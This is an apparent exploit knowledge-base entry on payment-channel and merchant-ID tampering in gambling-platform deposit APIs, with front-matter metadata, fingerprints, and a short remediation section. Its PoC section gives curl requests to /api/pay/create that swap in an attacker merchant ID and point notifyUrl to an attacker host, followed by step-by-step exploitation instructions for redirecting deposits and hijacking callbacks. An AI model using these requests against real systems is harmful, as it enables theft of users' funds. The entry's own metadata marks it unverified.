---
title: Payment-channel / merchant-ID tampering (deposits sent to the attacker's account)
cve: None (business logic)
severity: critical
cvss: 9.4
product: Custom deposit/payment routing (turnkey gambling platforms)
versions: Any
ports: 80, 443
keywords: payment channel, merchant ID, deposit, routing, tampering, funds
entry: channelId / merchantId / notifyUrl in /api/pay/create
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

```
POST /api/pay/create   {"amount":100,"channelId":3,"merchantId":""}
GET  /api/pay/channels → Returns the available channel list
```

## Prerequisites

- An ordinary member account; ability to capture deposit-order requests.

## PoC

```bash
# 1) Create a normal order; record its number and channel
curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"amount":100,"channelId":3}' | jq '.data'

# 2) Change the channel/merchant ID and check whether it is accepted
curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' \
  -d '{"amount":100,"channelId":3,"merchantId":"<attacker-merchant-ID>","notifyUrl":"https://attacker/n"}' | jq '.data.payUrl'
# Confirmation: the returned payment link's merchant/payee changes to the attacker's
```

```bash
# 3) If only payUrl is returned, inspect its parameters for controllable merchant/uid values
curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
  -d '{"amount":1,"channelId":3}' | grep -o 'merchant[^&]*'
```

## Exploitation Steps

1. First create a normal order (1 yuan) to establish the workflow;
2. Change merchantId/notifyUrl and check whether the order response accepts them;
3. Acceptance means "deposits sent to the attacker" or "callback hijacking"—financial impact, immediately critical;
4. Evidence: payUrl differences between the two order responses.

## Remediation and Mitigation

- Select channels and merchant IDs only server-side according to product configuration; ignore all such request-body fields.
- Fix the callback address and verify signatures covering amount/merchant/order number.

## References

- OWASP WSTG-BUSL-01; CWE-472.
